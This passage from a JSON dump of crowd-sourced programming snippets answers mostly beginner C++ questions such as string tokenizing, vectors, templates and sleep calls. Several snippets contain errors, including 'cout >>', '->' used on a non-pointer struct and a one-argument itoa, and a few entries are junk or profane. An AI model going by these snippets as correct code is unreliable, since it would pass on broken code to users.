    "description": "char sendbuf[BUFFER_SIZE]; fgets(sendbuf, sizeof(sendbuf), stdin); send(sock_cli, sendbuf, strlen(sendbuf),0); //Send out memset(sendbuf, 0, sizeof(sendbuf));\n",
    "reg_date": "2021-10-12T11:41:20.000Z"
  },
  {
    "id": 2669,
    "keyword": null,
    "link": null,
    "title": " how to tokenize a string in c++",
    "description": "std::vector<std::string> split(const string& input, const string& regex) {     // passing -1 as the submatch index parameter performs splitting     std::regex re(regex);     std::sregex_token_iterator         first{input.begin(), input.end(), re, -1},         last;     return {first, last}; } \nauto const str = \"The quick brown fox\"s; auto const re = std::regex{R\"(\\s+)\"}; auto const vec = std::vector<std::string>(     std::sregex_token_iterator{begin(str), end(str), re, -1},     std::sregex_token_iterator{} ); \n//the program take input as string and delimiter is ','. //delimiter can  be changed in line 9;  std::vector<std::string> tokenise(const std::string &str){     std::vector<std::string> tokens;     int first = 0;     //std::cout<<\"aditya\";     while(first<str.size()){         int second = str.find_first_of(',',first);         //first has index of start of token         //second has index of end of token + 1;         if(second==std::string::npos){             second = str.size();         }         std::string token = str.substr(first, second-first);         //axaxax,asas,csdcs,cscds         //0123456         tokens.push_back(token);         first = second + 1;     }     return tokens; } \n",
    "reg_date": "2021-10-12T11:41:20.000Z"
  },
  {
    "id": 2670,
    "keyword": null,
    "link": null,
    "title": " how to tokenize a string in c++11",
    "description": "std::vector<std::string> split(const string& input, const string& regex) {     // passing -1 as the submatch index parameter performs splitting     std::regex re(regex);     std::sregex_token_iterator         first{input.begin(), input.end(), re, -1},         last;     return {first, last}; } \nauto const str = \"The quick brown fox\"s; auto const re = std::regex{R\"(\\s+)\"}; auto const vec = std::vector<std::string>(     std::sregex_token_iterator{begin(str), end(str), re, -1},     std::sregex_token_iterator{} ); \n//the program take input as string and delimiter is ','. //delimiter can  be changed in line 9;  std::vector<std::string> tokenise(const std::string &str){     std::vector<std::string> tokens;     int first = 0;     //std::cout<<\"aditya\";     while(first<str.size()){         int second = str.find_first_of(',',first);         //first has index of start of token         //second has index of end of token + 1;         if(second==std::string::npos){             second = str.size();         }         std::string token = str.substr(first, second-first);         //axaxax,asas,csdcs,cscds         //0123456         tokens.push_back(token);         first = second + 1;     }     return tokens; } \n",
    "reg_date": "2021-10-12T11:41:20.000Z"
  },
  {
    "id": 2671,
    "keyword": null,
    "link": null,
    "title": " how to turn int into string c++",
    "description": "#include <string>   std::string s = std::to_string(42);\nstd::to_string(23213.123)\nint a = 10; char *intStr = itoa(a); string str = string(intStr);\n",
    "reg_date": "2021-10-12T11:41:20.000Z"
  },
  {
    "id": 2672,
    "keyword": null,
    "link": null,
    "title": " how to type a vertical stack program c++",
    "description": "Hello               World                      This is My First Program \n",
    "reg_date": "2021-10-12T11:41:20.000Z"
  },
  {
    "id": 2673,
    "keyword": null,
    "link": null,
    "title": " how to type cast quotient of two integers to double with c++",
    "description": "// Utilize floating point numbers (`float` or `double`) by typecasting  int a = 5; int b = 10; double c = ((double)a) / ((double) b);  // This ensures that a and b are treated as doubles before being divided.  // If utilizing raw numbers, ensure to specify to the compiler that the number is a double  // or float like so:  double c = 5. / 10.; // The decimal (.) specifies a double  double d = 5.f / 10.f;; // the f specifies a float \n",
    "reg_date": "2021-10-12T11:41:20.000Z"
  },
  {
    "id": 2674,
    "keyword": null,
    "link": null,
    "title": " how to use a new node c++",
    "description": "struct node(){   int key;    node *next;   node(x){       key = x;     next = NULL;      }} // after you take a input of a linked list . // creating a new node. node *temp = new node(key);  // tem pointer pointing towards the new node.  temp -> next = head; // inserting the mew node in the start .    \n",
    "reg_date": "2021-10-12T11:41:21.000Z"
  },
  {
    "id": 2675,
    "keyword": null,
    "link": null,
    "title": " how to use a non const function from a const function",
    "description": "struct A {     int i=0; \tvoid foo() const     {       const_cast<A&>(*this).func();     }   \tvoid func()     {       i++;     } };\n",
    "reg_date": "2021-10-12T11:41:21.000Z"
  },
  {
    "id": 2676,
    "keyword": null,
    "link": null,
    "title": " how to use a variable as a char array size in c++",
    "description": "string strOne; \tcin >> strOne; \tstring::size_type count = strOne.size(); \tchar *x = new char[count]();  \tfor (int i = 0; i < count; i++){ \t\tx[i] = strOne.at(i); \t} \tfor (int i = 0; i < count; i++){ \t\tcout << x[i]; \t}\n",
    "reg_date": "2021-10-12T11:41:21.000Z"
  },
  {
    "id": 2677,
    "keyword": null,
    "link": null,
    "title": " how to use array without size in c++",
    "description": "#include <iostream>  int main() { \t//Create a user input size \tint size; \tstd::cout << \"Enter Size Of Array : \"; \tstd::cin >> size;  \t//Create the array with the size the user input \tint *myArray = new int[size];  \t//Populate the array with whatever you like.. \tfor(int i = 0; i < size; ++i) \t{ \t\tmyArray[i] = rand() % 10; \t}  \t//Display whats in the array... \tfor(int i = 0; i < size; ++i) \t{ \t\tstd::cout << \"Item In Element \" << i << \" of the array = : \" << myArray[i] << std::endl; \t}  \t//Delete the array \tdelete[] myArray;  \treturn 0; }\n",
    "reg_date": "2021-10-12T11:41:21.000Z"
  },
  {
    "id": 2678,
    "keyword": null,
    "link": null,
    "title": " how to use command line arguments with integers in c++",
    "description": "int val = stoi(argv[1]);\n",
    "reg_date": "2021-10-12T11:41:21.000Z"
  },
  {
    "id": 2679,
    "keyword": null,
    "link": null,
    "title": " how to use comparitor in priority queu in c++",
    "description": "class Node; bool Compare(Node a, Node b);  std::priority_queue<Node, std::vector<Node>, decltype(&Compare)> openSet(Compare); \n",
    "reg_date": "2021-10-12T11:41:21.000Z"
  },
  {
    "id": 2680,
    "keyword": null,
    "link": null,
    "title": " how to use for c++",
    "description": "#include <iostream> using namespace std; int main(){    for(int i=1; i<=6; i++){       /* This statement would be executed        * repeatedly until the condition        * i<=6 returns false.        */       cout<<\"Value of variable i is: \"<<i<<endl;    }    return 0; }\n",
    "reg_date": "2021-10-12T11:41:21.000Z"
  },
  {
    "id": 2681,
    "keyword": null,
    "link": null,
    "title": " how to use getline function inc",
    "description": "size_t getline(char **lineptr, size_t *n, FILE *stream);Copy\n",
    "reg_date": "2021-10-12T11:41:21.000Z"
  },
  {
    "id": 2682,
    "keyword": null,
    "link": null,
    "title": " how to use goto label in c++",
    "description": "goto label; ... .. ... ... .. ... ... .. ... label:  statement; ... .. ...\n",
    "reg_date": "2021-10-12T11:41:21.000Z"
  },
  {
    "id": 2683,
    "keyword": null,
    "link": null,
    "title": " how to use line renderer moving camera unity",
    "description": "You simply have to update the points in Update to new world positions each update (and not just when you create the curve).  Something along:  int i = 0;   foreach screenPosition of my curve    Vector3 worldPosition = camera.ScreenToWorldPoint(screenPosition);     lineRenderer.SetPosition(i, worldPosition);    i++;  The tricky part will be to update if you interpolate screenpositions (or worldPositions), or sample them. In either case, the slow but easy method will be to re-interpolate and resample each Update.  Once you have got this going, you can optimise by storing the the right number of points in screen space. Then you only have to convert to world space - no need to resample or reinterpolate.\n",
    "reg_date": "2021-10-12T11:41:22.000Z"
  },
  {
    "id": 2684,
    "keyword": null,
    "link": null,
    "title": " how to use max element in c++ with vector",
    "description": "int main()  {      // Get the vector      vector<int> a = { 1, 45, 54, 71, 76, 12 };         // Print the vector      cout << \"Vector: \";      for (int i = 0; i < a.size(); i++)          cout << a[i] << \" \";      cout << endl;         // Find the max element      cout << \"\\nMax Element = \"          << *max_element(a.begin(), a.end());      return 0;  } \n",
    "reg_date": "2021-10-12T11:41:22.000Z"
  },
  {
    "id": 2685,
    "keyword": null,
    "link": null,
    "title": " how to use mersenne twister engine in c++ to generate random numbers",
    "description": "// For pseudo-random number generators and distributions #include <random>   ...      // Use random_device to generate a seed for Mersenne twister engine. std::random_device rd{};      // Use Mersenne twister engine to generate pseudo-random numbers. std::mt19937 engine{rd()};  // \"Filter\" MT engine's output to generate pseudo-random double values, // **uniformly distributed** on the closed interval [0, 1]. // (Note that the range is [inclusive, inclusive].) std::uniform_real_distribution<double> dist{0.0, 1.0};  // Generate pseudo-random number. double x = dist(engine); \n",
    "reg_date": "2021-10-12T11:41:22.000Z"
  },
  {
    "id": 2686,
    "keyword": null,
    "link": null,
    "title": " how to use pointer to struct c++",
    "description": "typedef struct{     int vin;     char* make;     char* model;     int year;     double fee; }car;  car TempCar; tempCar->vin = 1234;  // metodo 1 (*tempCar).make = \"GM\"; // metodo 2 tempCar->year = 1999; tempCar->fee = 20.5; \n",
    "reg_date": "2021-10-12T11:41:22.000Z"
  },
  {
    "id": 2687,
    "keyword": null,
    "link": null,
    "title": " how to use printf with <cinttypes> c++",
    "description": "#include <cinttypes> printf(\"%\" PRId64 \"\", d);  \n",
    "reg_date": "2021-10-12T11:41:22.000Z"
  },
  {
    "id": 2688,
    "keyword": null,
    "link": null,
    "title": " how to use printf with microseconds c++",
    "description": "template<typename Rep, typename Ratio> printf_dur( std::chrono::duration< Rep, Ratio > dur ) {     printf( \"%lld ticks of %lld/%lld == %.3fs\",             (long long int) dur.count(),             (long long int) Ratio::num,             (long long int) Ratio::den,             ( (Ratio::num == 1LL)               ? (float) dur.count() / (float) Ratio::den               : (float) dur.count() * (float) Ratio::num             )          ); } \nprintf(\"%lld\", static_cast<long long int> (d)); \n {    printf(\"%s\", std::to_string(d).c_str() );  } \n",
    "reg_date": "2021-10-12T11:41:22.000Z"
  },
  {
    "id": 2689,
    "keyword": null,
    "link": null,
    "title": " how to use priority queue comparator stl c++",
    "description": "class Foo {  };  class Compare { public:     bool operator() (Foo, Foo)     {         return true;     } };  int main() {     std::priority_queue<Foo, std::vector<Foo>, Compare> pq;     return 0; } \nvoid SamplePriorityQueueWithLamda() {     // using lambda to compare elements.     auto compare = [](int lhs, int rhs)                 {                     return lhs < rhs;                 };      std::priority_queue<int, std::vector<int>, decltype(compare)> q(compare);      for(int n : {1,8,5,6,3,4,0,9,7,2})         q.push(n);       printQueue(q); } \n",
    "reg_date": "2021-10-12T11:41:22.000Z"
  },
  {
    "id": 2690,
    "keyword": null,
    "link": null,
    "title": " how to use python sleep function on c++",
    "description": "// to use sleep function on windows with c++  #include <Windows.h> Sleep(3000)\n#include <unistd.h>  sleep(10);\n",
    "reg_date": "2021-10-12T11:41:22.000Z"
  },
  {
    "id": 2691,
    "keyword": null,
    "link": null,
    "title": " how to use sleep function in c++ windows",
    "description": "#include <chrono> #include <thread>  std::this_thread::sleep_for(std::chrono::milliseconds(x));\n#include <Windows.h>  Sleep(number of milliseconds);\n// to use sleep function on windows with c++ #include <Windows.h> Sleep(3000) // based on milliseconds\n",
    "reg_date": "2021-10-12T11:41:22.000Z"
  },
  {
    "id": 2692,
    "keyword": null,
    "link": null,
    "title": " how to use tostring method in c++",
    "description": "#include <string>  struct Student {     std::string name;     int age;     double finalGrade;      std::string toString() {         return \"Name: \" +              name +              \"\\n Age: \" +              std::to_string(age) +              \"\\n Final Grade: \" +              std::to_string(finalGrade);     } }; \n",
    "reg_date": "2021-10-12T11:41:22.000Z"
  },
  {
    "id": 2693,
    "keyword": null,
    "link": null,
    "title": " how to use vectors c++",
    "description": "#include <iostream> #include <vector> using namespace std;  int main() {   //vector element size   const int size = 4;    //vector with int data type   //all elements are equal to 4   vector<int> myVect (size, 4);    for (int i=0; i<size; i++) {     cout << \"Vector index(\" << i <<\") is: \"<< myVect[i] << endl;    }   return 0; }\n",
    "reg_date": "2021-10-12T11:41:23.000Z"
  },
  {
    "id": 2694,
    "keyword": null,
    "link": null,
    "title": " how to use wasd c++",
    "description": "#include <iostream> #include <conio.h> using namespace std; int main() {     char ch=0;     cout << \"Press Q to quit\\n\";     do     {         ch = getch();          switch(ch)         {             case 'W':             case 'w':                 cout << \"W was pressed \\n\";                 break;             case 'A':             case 'a':                 cout << \"A was pressed \\n\";                 break;             case 's':             case 'S':                 cout << \"S was pressed \\n\";                 break;             case 'D':             case 'd':                 cout << \"D was pressed \\n\";                 break;          }      }while (ch != 'Q' && ch!='q'); } \n",
    "reg_date": "2021-10-12T11:41:23.000Z"
  },
  {
    "id": 2695,
    "keyword": null,
    "link": null,
    "title": " how to use winmain function",
    "description": "INT WinMain(HINSTANCE hInstance,              HINSTANCE hPrevInstance,              PSTR lpCmdLine,             INT nCmdShow) { \treturn 0; }\n",
    "reg_date": "2021-10-12T11:41:23.000Z"
  },
  {
    "id": 2696,
    "keyword": null,
    "link": null,
    "title": " how to write C++ list",
    "description": "// constructing lists #include <iostream> #include <list>  int main () {   // constructors used in the same order as described above:   std::list<int> first;                                // empty list of ints   std::list<int> second (4,100);                       // four ints with value 100   std::list<int> third (second.begin(),second.end());  // iterating through second   std::list<int> fourth (third);                       // a copy of third    // the iterator constructor can also be used to construct from arrays:   int myints[] = {16,2,77,29};   std::list<int> fifth (myints, myints + sizeof(myints) / sizeof(int) );    std::cout << \"The contents of fifth are: \";   for (std::list<int>::iterator it = fifth.begin(); it != fifth.end(); it++)     std::cout << *it << ' ';    std::cout << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:41:23.000Z"
  },
  {
    "id": 2697,
    "keyword": null,
    "link": null,
    "title": " how to write a class in c++",
    "description": "class Rectangle  { \tint width, height; public: \tvoid set_values (int,int);     int area() {return width*height;} };  void Rectangle::set_values (int x, int y) { \twidth = x; \theight = y; }\nclass Rectangle {     int width, height;   public:     void set_values (int,int);     int area (void); } rect;\n/*  Keyword \"this\" You can use keyword \"this\" to refer to this instance inside a class definition.  One of the main usage of keyword this is to resolve ambiguity between the names of  data member and function parameter. For example: */ class Circle { private:    double radius;                 // Member variable called \"radius\"    ...... public:    void setRadius(double radius) { // Function's argument also called \"radius\"       this->radius = radius;          // \"this.radius\" refers to this instance's member variable          // \"radius\" resolved to the function's argument.    }    ...... }\nMyClass* MyObject = new MyClass();\n",
    "reg_date": "2021-10-12T11:41:23.000Z"
  },
  {
    "id": 2698,
    "keyword": null,
    "link": null,
    "title": " how to write a conclusion statement for an informative essay",
    "description": "// idk bruh\n",
    "reg_date": "2021-10-12T11:41:23.000Z"
  },
  {
    "id": 2699,
    "keyword": null,
    "link": null,
    "title": " how to write a simple code of getdata and display multiple object function in cpp",
    "description": "#include <iostream> #include <string>  using namespace std;  class Student { \tstring name; \tint marks; \tpublic: \t\tvoid getName() \t\t{ \t\t\tgetline( cin, name ); \t\t} \t\tvoid getMarks() \t\t{ \t\t\tcin >> marks; \t\t} \t\tvoid displayInfo() \t\t{ \t\t\tcout << \"Name : \" << name << endl; \t\t\tcout << \"Marks : \" << marks << endl; \t\t} };  int main() { \tStudent st[5]; \tfor( int i=0; i<5; i++ ) \t{ \t\tcout << \"Student \" << i + 1 << endl; \t\tcout << \"Enter name\" << endl; \t\tst[i].getName(); \t\tcout << \"Enter marks\" << endl; \t\tst[i].getMarks(); \t}  \tfor( int i=0; i<5; i++ ) \t{ \t\tcout << \"Student \" << i + 1 << endl; \t\tst[i].displayInfo(); \t} \treturn 0; } \n",
    "reg_date": "2021-10-12T11:41:23.000Z"
  },
  {
    "id": 2700,
    "keyword": null,
    "link": null,
    "title": " how to write a template c++",
    "description": "template <class T> void swap(T & lhs, T & rhs) {  T tmp = lhs;  lhs = rhs;  rhs = tmp; }  void main() {   int a = 6;   int b = 42;   swap<int>(a, b);   printf(\"a=%d, b=%d\\n\", a, b);      // Implicit template parameter deduction   double f = 5.5;   double g = 42.0;   swap(f, g);   printf(\"f=%f, g=%f\\n\", f, g); }  /* Output: a=42, b=6 f=42.0, g=5.5 */\ntemplate class  Graph<string>;\ntemplate <class myType> myType GetMax (myType a, myType b) {  return (a>b?a:b); }\n",
    "reg_date": "2021-10-12T11:41:23.000Z"
  },
  {
    "id": 2701,
    "keyword": null,
    "link": null,
    "title": " how to write an or in c++",
    "description": "if (a == 0 || b == 0) {   //statement here, || was used as an or }\n",
    "reg_date": "2021-10-12T11:41:23.000Z"
  },
  {
    "id": 2702,
    "keyword": null,
    "link": null,
    "title": " how to write hello world c++",
    "description": "#include <iostream>   int main ()  {   std::cout << \"Hello world\" << endl;    return 0; }\n",
    "reg_date": "2021-10-12T11:41:24.000Z"
  },
  {
    "id": 2703,
    "keyword": null,
    "link": null,
    "title": " how to write hello world in c++",
    "description": "#include <iostream>   int main(){  std::cout <<\"Hello World\" << std::endl;  return 0; } \n#include<iostream> using namespace std;  int main(){     cout << \"Hello World\" << endl;      return 0; }\n#include <iostream> //optional using namespace std; int main() {     std::cout << \"Hello, World!\" << std::endl;     return 0; } \n",
    "reg_date": "2021-10-12T11:41:24.000Z"
  },
  {
    "id": 2704,
    "keyword": null,
    "link": null,
    "title": " how to write int menu () function in c++",
    "description": "//Matthew Beard //Program 3  #include <iostream> #include <iomanip> using namespace std;  //Functions void showWelcome(); void showMenu(); int showSpring(); int showSummer(); int showFall(); int showWinter();    int main() {     int choice;     //menu choice               //constants for menu choices     const int SPRING_CHOICE = 1,               SUMMER_CHOICE = 2,               FALL_CHOICE = 3,               WINTER_CHOICE = 4,               QUIT_CHOICE = 5;          cout << fixed << showpoint << setprecision(1); //sets to 1 decimal place          do     {          showWelcome(); // Show Welcome screen          showMenu(); // Display Menu          cin >> choice;                    //Validate menu selection          while (choice < SPRING_CHOICE || choice > QUIT_CHOICE)          {                cout << \"Please enter a valid menu choice: \";                cin >> choice;          }                    //If user does not want to quit, proceed.          if (choice != QUIT_CHOICE)          {                     switch (choice)                     {                            case SPRING_CHOICE:                                 int showSpring();                                 break;                                                        case SUMMER_CHOICE:                                 int showSummer();                                 break;                                                             case FALL_CHOICE:                                 int showFall();                                 break;                                                        case WINTER_CHOICE:                                 int showWinter();                                 break;                     }          }          } while (choice != QUIT_CHOICE);          return 0; } //Welcome Function void showWelcome() {      cout << \"Welcome to the average rainfall calculator\" << endl << endl;      system (\"pause\"); }  //Menu Function  void showMenu() {         cout << \"Please choose a season\" << endl << endl          << \"1. Spring\" << endl          << \"2. Summer\" << endl          << \"3. Fall\" << endl          << \"4. Winter\"<< endl           << \"5. Quit\" << endl << endl; }      //Spring choice function  int showSpring(float spring, float spring1, float spring2, float spring3) {     cout << \"Enter the rainfall for month one \" << endl;     cin >> spring1;     cout << endl << \"Enter the rainfall for month two \" << endl;     cin >> spring2;     cout << endl << \"Enter the rainfall for month three \" << endl;     cin >> spring3;     spring = (spring1 + spring2 + spring3) / 3;     cout << endl << \"The average rainfall for Spring was \"          << spring << endl << endl;     return 0; }  //Summer choice function  int showSummer(float summer, float summer1, float summer2, float summer3) {     cout << endl << \"Enter the rainfall for month one \" << endl;     cin >> summer1;     cout << endl << \"Enter the rainfall for month two \" << endl;     cin >> summer2;     cout << endl << \"Enter the rainfall for month three \" << endl;     cin >> summer3;     summer = (summer1 + summer2 + summer3) / 3;     cout << endl << \"The the average rainfall for Summer was \"          << summer << endl << endl;     return 0; }  //Fall choice function  int showFall(float fall, float fall1, float fall2, float fall3) {     cout << endl << \"Enter the rainfall for month one \" << endl;     cin >> fall1;     cout << endl << \"Enter the rainfall for month two \" << endl;     cin >> fall2;     cout << endl << \"Enter the rainfall for month three \" << endl;     cin >> fall3;     fall = (fall1 + fall2 + fall3) / 3;     cout << endl << \"The average rainfall for Fall was \"          << fall << endl << endl;     return 0; }  //Winter choice function  int showWinter(float winter, float winter1, float winter2, float winter3) {     cout << endl << \"Enter the rainfall for month one \" << endl;     cin >> winter1;     cout << endl << \"Enter the rainfall for month two \" << endl;     cin >> winter2;     cout << endl << \"Enter the rainfall for month three \" << endl;     cin >> winter3;     winter = (winter1 + winter2 +winter3) / 3;     cout << endl << \"The average rainfall for Winter was \"          << winter << endl << endl;     return 0; }\n",
    "reg_date": "2021-10-12T11:41:24.000Z"
  },
  {
    "id": 2705,
    "keyword": null,
    "link": null,
    "title": " how to write int variable c++",
    "description": "//Declare integer variable in C++ int x; //Initialize integer variable x = 1;  //Declaring and Initialize in same line int y = 0;\n",
    "reg_date": "2021-10-12T11:41:24.000Z"
  },
  {
    "id": 2706,
    "keyword": null,
    "link": null,
    "title": " how to write something in power of a number in c++",
    "description": "#include <iostream> #include <cmath> using namespace std; int main(){   cout<<pow(10,2);   return 0; }\n",
    "reg_date": "2021-10-12T11:41:24.000Z"
  },
  {
    "id": 2707,
    "keyword": null,
    "link": null,
    "title": " how to writt array in c++",
    "description": "int [10]// syntax datatype[number of arrys/how many arrays do you want ]\n",
    "reg_date": "2021-10-12T11:41:24.000Z"
  },
  {
    "id": 2708,
    "keyword": null,
    "link": null,
    "title": " how to writte comment in c++",
    "description": "// coment here.\n",
    "reg_date": "2021-10-12T11:41:24.000Z"
  },
  {
    "id": 2709,
    "keyword": null,
    "link": null,
    "title": " how togreper",
    "description": "how to add grepper fuck im rich im the topper in class\n",
    "reg_date": "2021-10-12T11:41:24.000Z"
  },
  {
    "id": 2710,
    "keyword": null,
    "link": null,
    "title": " howt o initialize 3d vector in c++",
    "description": "vector<vector<vector<int>>> dp(n+1,vector<vector<int>>(n+1,vector<int>(n+1,-1)));\nvector<vector<vector<double>>> f(3, vector<vector<double>>(4, vector<double>(5)));\n",
    "reg_date": "2021-10-12T11:41:24.000Z"
  },
  {
    "id": 2711,
    "keyword": null,
    "link": null,
    "title": " http://nv-study.ru/http://nv-study.ru/http://nv-study.ru/",
    "description": " <!-- Файл конфигурации Web.Config -->  <configuration>     <system.web>         <customErrors mode=\"RemoteOnly\" defaultRedirect=\"mycustompage.htm\"/>     </system.web> </configuration>\n",
    "reg_date": "2021-10-12T11:41:24.000Z"
  },
  {
    "id": 2712,
    "keyword": null,
    "link": null,
    "title": " http and get in esp8266",
    "description": "#include <ESP8266HTTPClient.h> #include <ESP8266WiFi.h>   void setup() {     Serial.begin(115200);                 //Serial connection   WiFi.begin(\"yourSSID\", \"yourPASS\");   //WiFi connection     while (WiFi.status() != WL_CONNECTED) {  //Wait for the WiFI connection completion       delay(500);     Serial.println(\"Waiting for connection\");     }   }   void loop() {     if (WiFi.status() == WL_CONNECTED) { //Check WiFi connection status       HTTPClient http;    //Declare object of class HTTPClient       http.begin(\"http://192.168.1.88:8085/hello\");      //Specify request destination     http.addHeader(\"Content-Type\", \"text/plain\");  //Specify content-type header       int httpCode = http.POST(\"Message from ESP8266\");   //Send the request     String payload = http.getString();                  //Get the response payload       Serial.println(httpCode);   //Print HTTP return code     Serial.println(payload);    //Print request response payload       http.end();  //Close connection     } else {       Serial.println(\"Error in WiFi connection\");     }     delay(30000);  //Send a request every 30 seconds   } \n",
    "reg_date": "2021-10-12T11:41:24.000Z"
  },
  {
    "id": 2713,
    "keyword": null,
    "link": null,
    "title": " https://www.google",
    "description": "sparse_vector_t::sparse_vector_t(const vector_t<double>& v, const double eps)     : pv_(), nz_(0), n_(0) {    }\n",
    "reg_date": "2021-10-12T11:41:25.000Z"
  },
  {
    "id": 2714,
    "keyword": null,
    "link": null,
    "title": " hwo to calculate the number of digits using log in c++",
    "description": "#include <iostream> #include <cmath> using namespace std; int count_digit(int number) {    return int(log10(number) + 1);             //log (number) to the base 10 } int main() {    cout >> \"Number of digits in 1245: \" >> count_digit(1245)>> endl; } \n",
    "reg_date": "2021-10-12T11:41:25.000Z"
  },
  {
    "id": 2715,
    "keyword": null,
    "link": null,
    "title": " hwo to make a script to give track battery and give notification",
    "description": "import psutil import time import pyttsx3 from win10toast import ToastNotifier # also need to install win32api import threading  toaster = ToastNotifier() x=pyttsx3.init() x.setProperty('rate',130) x.setProperty('volume',8) count = 0  def show_notification(show_text):    toaster.show_toast(show_text,                        icon_path='battery_indicator.ico',                        duration=10)    # loop the toaster over some period of time    while toaster.notification_active():       time.sleep(0.1)  def monitor():    while (True):       time.sleep(10)       battery = psutil.sensors_battery()       plugged = battery.power_plugged       percent = int(battery.percent)        if percent < 40:          if plugged == False:             processThread = threading.Thread(target=show_notification, args=(\"Your Battery at \"+str(percent)+\"% Please plug the cable\",))  # <- note extra ','             processThread.start()             x.say(\"Your battery is getting low so charge it right now\")             x.runAndWait()             count = 0       elif percent == 100:          if plugged == True:             processThread = threading.Thread(target=show_notification, args=(\"Charging is getting complete\",))  # <- note extra ','             processThread.start()             x.say(\"Charging is getting complete\")             x.runAndWait()       elif percent == 90:          if plugged == True:             if count == 0:                processThread = threading.Thread(target=show_notification, args=(\"Your Battery at 90% Please plug out the cable\",))  # <- note extra ','                processThread.start()                x.say(\"Your battery at 90% \")                x.runAndWait()                count = count + 1  if __name__ == \"__main__\":    monitor()     \n",
    "reg_date": "2021-10-12T11:41:25.000Z"
  },
  {
    "id": 2716,
    "keyword": null,
    "link": null,
    "title": " hwo to send token on redirection in passport",
    "description": "res.set('x-token', token); res.redirect(...); \nres.cookie('token', token, ...); res.redirect(...); \nres.redirect(`/some/url?token=${token}`); \n",
    "reg_date": "2021-10-12T11:41:25.000Z"
  },
  {
    "id": 2717,
    "keyword": null,
    "link": null,
    "title": " hybrid inheritance template",
    "description": "#include<iostream.h>#include<conio.h>int a,b,c,d,e; class A    {protected:public:void getab()    {cout<<\"\\n ENter a and b value:\";cin>>a>>b;        }}; class B:public A    {protected:public:void getc()    {cout<<\"Enter c value:\";cin>>c;    }}; class C    {protected:public:void getd()    {cout<<\"Enter d value:\";cin>>d;    }}; class D:public B,public C    {protected:public:void result()    {getab();    getc();getd();    e=a+b+c+d;cout<<\"\\n Addition is :\"<<e; }}; void main()    {clrscr();D d1;d1.result();getch();        } \n",
    "reg_date": "2021-10-12T11:41:25.000Z"
  },
  {
    "id": 2718,
    "keyword": null,
    "link": null,
    "title": " hz",
    "description": "144hz\n",
    "reg_date": "2021-10-12T11:41:25.000Z"
  },
  {
    "id": 2719,
    "keyword": null,
    "link": null,
    "title": " i'm still here lyrics",
    "description": " Azuz is not my leaderAwesome anagramAwesome anagram Azuz is \n",
    "reg_date": "2021-10-12T11:41:25.000Z"
  },
  {
    "id": 2720,
    "keyword": null,
    "link": null,
    "title": " i2c slave onreceive",
    "description": "Wire.onReceive(handler)  // Registers a function to be called when a slave device receives // a transmission from a master  // handler: the function to be called when the slave receives data; // this should take a single int parameter (the number of bytes read // from the master) and return nothing // e.g.: void myHandler(int numBytes)\n",
    "reg_date": "2021-10-12T11:41:25.000Z"
  },
  {
    "id": 2721,
    "keyword": null,
    "link": null,
    "title": " idnefier cout in undefined",
    "description": "std::cout << .... << std::endl;; \n",
    "reg_date": "2021-10-12T11:41:25.000Z"
  },
  {
    "id": 2722,
    "keyword": null,
    "link": null,
    "title": " idnefier endl in undefince",
    "description": "try adding: std:: before both of your endl's \n",
    "reg_date": "2021-10-12T11:41:26.000Z"
  },
  {
    "id": 2723,
    "keyword": null,
    "link": null,
    "title": " if(arr[i]==k) return arr[i];",
    "description": "if(arr[i]==k){ return  arr[i]; }\n",
    "reg_date": "2021-10-12T11:41:26.000Z"
  },
  {
    "id": 2724,
    "keyword": null,
    "link": null,
    "title": " if",
    "description": "#!/bin/bash if [ $# -lt 1 ] then   echo \"Usage: $0 file ...\"   exit 1 fi  echo \"$0 counts the lines of code\"   l=0  for f in $* do  l=`wc -l $f | sed 's/^\\([0-9]*\\).*$/\\1/'`  echo \"$f: $l\" done\nif(a!=b){ c=a+b; }\nif   \n",
    "reg_date": "2021-10-12T11:41:26.000Z"
  },
  {
    "id": 2725,
    "keyword": null,
    "link": null,
    "title": " if arduino",
    "description": "if (condition1) {   // Tue Task 1 } else if (condition2) {   // Tue Task 2 } else {   // Tue Task 3 }\nif (x > 120) {   digitalWrite(LEDpin, HIGH); }  if (x > 120) {   digitalWrite(LEDpin, HIGH); }  if (x > 120) {   digitalWrite(LEDpin, HIGH); }  if (x > 120) {   digitalWrite(LEDpin1, HIGH);   digitalWrite(LEDpin2, HIGH); } // Alle Anweisungen sind korrekt\nThe #if condition is evaluated only at compile time. The \"if\" is evaluated at run time.\nif (condition) {   //statement(s) }\npinMode(LED_BUILTIN, OUTPUT);\nif   \n",
    "reg_date": "2021-10-12T11:41:26.000Z"
  },
  {
    "id": 2726,
    "keyword": null,
    "link": null,
    "title": " if argv == string",
    "description": "int main(int argc, char * argv[]) {    if (argv[1] == \"yes\"); // Wrong, compares two pointers   if (strcmp(argv[1], \"yes\") == 0); // This compares what the pointers point to   if (std::string(argv[1]) == \"yes\"); // Works fine   if (argv[1] == std::string(\"yes\")); // Works fine    // Easy-mode       std::vector<std::string> args(argv, argv+argc);   for (size_t i = 1; i < args.size(); ++i) {       if (args[i] == \"yes\") {           // do something       }   }  }\n",
    "reg_date": "2021-10-12T11:41:26.000Z"
  },
  {
    "id": 2727,
    "keyword": null,
    "link": null,
    "title": " if c++",
    "description": "   if( a == 10 ) {       cout << \"Value of a is 10\" << endl;    } else if( a == 20 ) {       // if else if condition is true       cout << \"Value of a is 20\" << endl;    } \nint x = 20; int y = 18; if (x > y) {   cout << \"x is greater than y\"; }\nif (condition) {   // block of code to be executed if the condition is true }\n#include<iostream> using namespace std; int main(){ \tint eta;  \tcout<<\"Ciao Utente inserisci la tua eta'! \"<<\"\\n\"; \tcin>>eta; \tif(eta >= 18){ \t\tcout<<\"Benvenuto al cinema!\"; \t} }\n",
    "reg_date": "2021-10-12T11:41:26.000Z"
  },
  {
    "id": 2728,
    "keyword": null,
    "link": null,
    "title": " if else c++",
